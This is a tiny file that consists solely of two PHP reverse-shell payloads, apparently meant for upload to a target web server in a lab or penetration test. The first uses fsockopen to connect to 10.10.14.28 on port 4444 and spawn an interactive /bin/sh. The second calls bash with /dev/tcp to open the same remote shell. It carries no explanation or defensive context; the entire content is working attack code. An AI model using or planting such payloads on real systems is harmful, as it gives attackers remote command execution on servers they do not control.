<?php $sock=fsockopen('10.10.14.28',4444); exec("/bin/sh -i <&3 >&3 2>&3"); ?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/'10.10.14.28'/4444 0>&1'");?>
